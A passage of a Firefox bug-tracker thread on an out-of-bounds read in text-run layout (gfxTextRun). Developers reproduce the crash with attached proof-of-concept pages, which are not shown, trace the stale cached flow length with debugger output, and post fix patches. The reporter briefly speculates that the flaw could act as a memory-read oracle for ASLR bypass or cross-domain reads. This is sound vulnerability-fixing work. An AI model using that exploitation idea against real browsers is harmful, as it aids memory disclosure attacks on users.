    <table class="layout-table change-head assignee" id="ch-6" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_5168" id="a96155_75935"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-6"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-6" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c6">Comment 6</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-02 13:04 PST" data-time="1488488694">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-6">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-6" data-comment-id="12111598">Yeah, I can reproduce it in both an Opt ASAN build and a debug build on Linux64.
Manically resizing the window while also reloading the page seems to do it for me.

Looks like an array-index-out-of-bounds on gfxShapedText::mDetailedGlyphs.
My brain is tired though, so I'm not really sure what's going on...</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(ifratric)</span></div></div></div><div class="change-set" id="c7"><div class="comment" data-id="12111690" data-no="7"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-7" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_278074" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/cd9b85b2e112bd7941b21ad03f42604e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_278074" id="a96155_75935"><a class="email " href="/user_profile?user_id=278074" > <span class="fna">Daniel Holbert [:dholbert]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-7"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-7" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c7">Comment 7</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-02 13:32 PST" data-time="1488490337">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-7">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-7" data-comment-id="12111690">Thanks -- resizing my browser (horizontally, from small to medium-sized) just after a reload seems to trigger the issue for me too.</pre></div><div class="change-set" id="c8"><div class="comment" data-id="12113187" data-no="8"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-8" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_589159" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/b046be2bb71e904ec3b1a5a1176b3443?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_589159" id="a96155_75935"><a class="email " href="/user_profile?user_id=589159" > <span class="fna">Ivan Fratric</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-8"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-8" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c8">Comment 8</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-03 02:49 PST" data-time="1488538175">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-8">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-8" data-comment-id="12113187">Sorry about the unreliable PoC, it worked reliably on my config and I wanted to report ASAP, but it seems it is quite dependent on the window size / layout. For me it works reliably with the window.innerWidth x window.innerHeight = 960 x 827.

I confirmed the bug on mozilla-central optimized build (just did it again on the latest build) on Ubuntu 64 and in addition to this also on a custom ASan build of mozilla-central (though that one is a couple of days old) and on an ASan build of Firefox firefox-51.0.1.

I'm also attaching the original PoC as well as a slightly modified PoC that triggers OOB read that is even more outside the the bounds of the buffer than the original, so it also crashes &quot;normal&quot; (non-ASan) release of Firefox 51.0.1 (at least in when rendered with the same window size). Spaces and newlines in the PoC are quite important so in this case it's better to attach than copy / paste.

To comment a bit on the security impact: What is read out of bound are glyph widths. I haven't tried to exploit this further but presumably reading incorrect glyph widths would cause the differences in page layout which an attacker could use as oracle to determine values in memory they wouldn't normally be able to read. This might result in ASLR bypass, reading data cross-domain etc. Wouldn't be the most elegant exploit ever but seems like a plausible scenario.</pre></div><div class="change-set" id="c9"><div class="comment" data-id="12113192" data-no="9"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-9" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_589159" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/b046be2bb71e904ec3b1a5a1176b3443?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_589159" id="a96155_75935"><a class="email " href="/user_profile?user_id=589159" > <span class="fna">Ivan Fratric</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-9"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-9" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c9">Comment 9</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-03 02:51 PST" data-time="1488538273">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-9">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8843258"
         class="attachment"
         data-id="8843258" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="oob1.html">
      <meta itemprop="contentSize" content="762">
      <meta itemprop="encodingFormat" content="text/html">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=8843258" itemprop="contentUrl">
        <span id="att-8843258-description" itemprop="description">Original PoC</span></a>
        — <a href="attachment.cgi?id=8843258&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="c10"><div class="comment" data-id="12113195" data-no="10"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-10" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_589159" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/b046be2bb71e904ec3b1a5a1176b3443?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_589159" id="a96155_75935"><a class="email " href="/user_profile?user_id=589159" > <span class="fna">Ivan Fratric</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-10"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-10" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c10">Comment 10</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-03 02:51 PST" data-time="1488538317">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-10">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8843259"
         class="attachment"
         data-id="8843259" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="oob2.html">
      <meta itemprop="contentSize" content="824">
      <meta itemprop="encodingFormat" content="text/html">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=8843259" itemprop="contentUrl">
        <span id="att-8843259-description" itemprop="description">Modified PoC that accesses more out-of-bounds data</span></a>
        — <a href="attachment.cgi?id=8843259&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="c11"><div class="comment" data-id="12114430" data-no="11"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-11" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_278074" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/cd9b85b2e112bd7941b21ad03f42604e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_278074" id="a96155_75935"><a class="email " href="/user_profile?user_id=278074" > <span class="fna">Daniel Holbert [:dholbert]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-11"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-11" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c11">Comment 11</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-03 10:52 PST" data-time="1488567126">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-11">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-11" data-comment-id="12114430">With both PoCs, I hit these 4 assertion failures before ASAN crashes:
{
###!!! ASSERTION: frame tree not empty, but caller reported complete status: 'start == end || IsInLetterFrame(aSubtreeRoot)', file layout/base/nsLayoutUtils.cpp, line 7479
###!!! ASSERTION: frame tree not empty, but caller reported complete status: 'start == end || IsInLetterFrame(aSubtreeRoot)', file layout/base/nsLayoutUtils.cpp, line 7479
###!!! ASSERTION: Invalid offset: 'uint32_t(aOffset) &lt;= mSkipChars-&gt;mCharCount', file gfx/thebes/gfxSkipChars.cpp, line 23
###!!! ASSERTION: Substring out of range: 'aRange.end &lt;= GetLength()', file gfx/thebes/gfxTextRun.cpp, line 1040
}

The latter two assertions in particular sound like they're reporting an out-of-bounds read -- probably the same root issue -- in a way that can be detected/debugged in a normal (non-ASAN) debug build.</pre><div class="activity"><div class="change">Keywords: <a href="/buglist.cgi?keywords=assertion&amp;resolution=---">assertion</a></div><div class="change">Summary: out-of-bounds read in gfxTextRun &rarr; ASAN: out-of-bounds read in gfxTextRun (after &quot;ASSERTION: Invalid offset&quot; and &quot;ASSERTION: Substring out of range&quot;)</div></div></div><div class="change-set" id="c12"><div class="comment" data-id="12114484" data-no="12"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-12" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_329583" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/e0f9759e1d7514ae4adfd806869e3c5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_329583" id="a96155_75935"><a class="email " href="/user_profile?user_id=329583" > <span class="fna">Jonathan Kew (:jfkthame)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-12"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-12" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c12">Comment 12</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-03 11:02 PST" data-time="1488567769">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-12">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-12" data-comment-id="12114484">Yes - on a (non-ASAN) debug build, I see the same sequence of assertions, followed by a fatal assertion and crash when trying to dereference a null UniquePtr.

The immediate failure occurs when we end up trying to call GetAdvanceWidth() on a textrun for a range that corresponds to a bunch of trailing spaces (from nsTextFrame::TrimTrailingWhiteSpace), but the textrun was created only for the visible text, not the (to-be-trimmed) trailing spaces, and so we read far off the end of its glyph array.

But I haven't worked back sufficiently to figure out why we end up in that situation. The PoC is a bit erratic for me; sometimes I can get it to assert/crash very quickly, other times it seems hard to reproduce. I tried to record a crash with rr, but then couldn't get replay to work; will try updating my rr and see if that helps.</pre></div><div class="change-set" id="c13"><div class="comment" data-id="12114782" data-no="13"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-13" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_5168" id="a96155_75935"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-13"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-13" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c13">Comment 13</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-03 12:25 PST" data-time="1488572722">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-13">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8843424"
         class="attachment patch"
         data-id="8843424" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="ClearTextRuns">
      <meta itemprop="contentSize" content="4002">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8843424">
          <a class="link" href="attachment.cgi?id=8843424&amp;action=diff">
        <span id="att-8843424-description" itemprop="description">wip</span></a>
        — <a href="attachment.cgi?id=8843424&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1343552&attachment=8843424">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-13" data-comment-id="12114782">It seems the problem is that we're not clearing out the text runs
properly when deleting text frame next-in-flows.  The problem
starts when we have a couple of text frames like so:

Text(1)&quot;aaaaaaaaaaaaaaaaaa\n&quot;&#64;7fee15785f30 next-in-flow=7fee1577b0f0 {0,0,41040,4380} [state=0000004020220000] [content=7fee1f3af1f0] [sc=7fee15767860:-moz-text] [run=7fee0f11b420][0,19,F] 
(rr) p mTextRun-&gt;GetLength()
$71 = 19
(rr) p canTrimTrailingWhitespace
$73 = true
Text(1)&quot;\n\n&quot;&#64;7fee1577b0f0 prev-in-flow=7fee15785f30 {0,0,0,4380} [state=4000000090620004] [content=7fee1f3af1f0] [sc=7fee15767860:-moz-text] [run=0][19,2,T] 

We reflow the first continuation and find that it's complete.
This is because the 2nd continuation only has insignificant whitespace.
So we delete that continuation and end up in nsContinuingTextFrame::DestroyFrom:
<a rel="nofollow" href="http://searchfox.org/mozilla-central/rev/546a05fec017cb785fca62a5199d42812a6a1fd3/layout/generic/nsTextFrame.cpp#4425">http://searchfox.org/mozilla-central/rev/546a05fec017cb785fca62a5199d42812a6a1fd3/layout/generic/nsTextFrame.cpp#4425</a>
Since these two frames have the same style context and IsInTextRunUserData()
is false, we don't clear the text runs.  So the first continuation still
has a text run that maps 19 characters, but it's content length is now 21.
Everything falls apart from there...

So this WIP tests for this condition more directly by comparing the text runs.
If we share the text run with mPrevContinuation then everything is fine since
that text run already maps the content that frame will now cover when its
continuation is destroyed.

There are still a few bogus assertions with this patch:
ASSERTION: frame tree not empty, but caller reported complete status: 'aSubtreeRoot-&gt;IsEmpty() || IsInLetterFrame(aSubtreeRoot)', file layout/base/nsLayoutUtils.cpp, line 7476
This is because nsTextFrame::IsEmpty() is quite broken for text continuations.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(mats)</span></div></div></div><div class="change-set" id="c14"><div class="comment" data-id="12114797" data-no="14"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-14" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_5168" id="a96155_75935"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-14"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-14" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c14">Comment 14</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-03 12:32 PST" data-time="1488573127">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-14">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-14" data-comment-id="12114797">I'm not sure yet if 'hasPrevContinuationWithDifferentTextRun' needs to be part of
the condition for clearing text runs for 'this' frame.  That's what we did
before so I included it, but my gut feeling is that it can be removed.</pre></div><div class="change-set" id="c15"><div class="comment" data-id="12114855" data-no="15"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-15" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_5168" id="a96155_75935"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-15"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-15" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c15">Comment 15</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-03 12:50 PST" data-time="1488574218">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-15">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-15" data-comment-id="12114855">Hmm, it's a bit odd though that GetInFlowContentLength() returns 19,
when mContent-&gt;TextLength() is 21.  Maybe we didn't update the cached
property at some point? and we really should have reported incomplete
status from the reflow?</pre></div><div class="change-set" id="c16"><div class="comment" data-id="12114908" data-no="16"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-16" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_5168" id="a96155_75935"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-16"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-16" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c16">Comment 16</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-03 13:04 PST" data-time="1488575044">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-16">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-16" data-comment-id="12114908">Right, it seems the value in the nsGkAtoms::flowlength property is bogus.
When we first cache it we have frame tree like so:
Text(1)&quot;aaaaaaaaaaaaaaaaaa\n&quot;&#64;7f623fee4140 next-continuation=7f62401aa370 {0,0,41040,4380} [state=0001004020020000] [content=7f623ef18860] [sc=7f623fee49f0:-moz-text] [run=7f62401920e0][0,19,F] 
Text(1)&quot;\n&quot;&#64;7f62401aa370 prev-continuation=7f623fee4140 next-in-flow=7f62401aa3e8 {0,0,0,4380} [state=40010000b0620000] [content=7f623ef18860] [sc=7f623fee49f0:-moz-text] [run=7f624034f860][19,1,F] 
Text(1)&quot;\n&quot;&#64;7f62401aa3e8 prev-in-flow=7f62401aa370 {0,0,0,4380} [state=40000000b0620004] [content=7f623ef18860] [sc=7f623fee49f0:-moz-text] [run=7f624034f8f0][20,1,T] 

Note that the middle frame there is a non-fluid continuation.
At this point, 19 is the correct value, but it seems we then
change the continuations without clearing this cached value...</pre></div><div class="change-set" id="c17"><div class="comment" data-id="12114967" data-no="17"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-17" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_5168" id="a96155_75935"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-17"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-17" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c17">Comment 17</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-03 13:20 PST" data-time="1488576010">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-17">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-17" data-comment-id="12114967">Yes, it changes here:
#0  operator|= (aLeft=&#64;0x7f62401aa3b0: 4611686021386600452, aRight=nsFrameState::NS_FRAME_IS_FLUID_CONTINUATION) at nsFrameState.h:43
#1  nsIFrame::AddStateBits (this=0x7f62401aa370, aBits=nsFrameState::NS_FRAME_IS_FLUID_CONTINUATION) at nsIFrame.h:1829
#2  nsTextFrame::SetNextInFlow (this=0x7f623fee4140, aNextInFlow=0x7f62401aa370) at layout/generic/nsTextFrame.h:119
#3  MakeContinuationFluid (aFrame=0x7f623fee4140, aNext=0x7f62401aa370) at layout/base/nsBidiPresUtils.cpp:564
#4  nsBidiPresUtils::TraverseFrames (aLineIter=0x7ffe7e4bd080, aCurrentFrame=0x7f623fee4140, aBpd=0x7ffe7e4bd0b0) at layout/base/nsBidiPresUtils.cpp:1166
...</pre></div><div class="change-set" id="c18"><div class="comment" data-id="12115043" data-no="18"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-18" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_5168" id="a96155_75935"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-18"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-18" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c18">Comment 18</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-03 13:43 PST" data-time="1488577411">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-18">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8843463"
         class="attachment patch obsolete"
         data-id="8843463" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="flowlength">
      <meta itemprop="contentSize" content="2348">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8843463">
          <a class="link" href="attachment.cgi?id=8843463&amp;action=diff">
        <span id="att-8843463-description" itemprop="description">wip2</span></a> (obsolete)
        — <a href="attachment.cgi?id=8843463&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1343552&attachment=8843463">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-18" data-comment-id="12115043">This fixes the crash and all the assertions.  The frame that previously
reflowed as complete will now be incomplete since it now sees that 19 != 21.</pre></div><div class="change-set" id="c19"><div class="comment" data-id="12115051" data-no="19"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-19" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_5168" id="a96155_75935"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-19"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-19" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c19">Comment 19</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-03 13:44 PST" data-time="1488577488">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-19">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8843464"
         class="attachment patch obsolete"
         data-id="8843464" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="flowlength">
      <meta itemprop="contentSize" content="2348">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8843464">
          <a class="link" href="attachment.cgi?id=8843464&amp;action=diff">
        <span id="att-8843464-description" itemprop="description">wip2</span></a> (obsolete)
        — <a href="attachment.cgi?id=8843464&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1343552&attachment=8843464">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-19" data-comment-id="12115051">(Right file this time.)</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8843463&amp;action=edit"
           title="wip2"
           class=""
        >Attachment #8843463</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c20"><div class="comment" data-id="12115864" data-no="20"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-20" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_329583" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/e0f9759e1d7514ae4adfd806869e3c5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_329583" id="a96155_75935"><a class="email " href="/user_profile?user_id=329583" > <span class="fna">Jonathan Kew (:jfkthame)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-20"
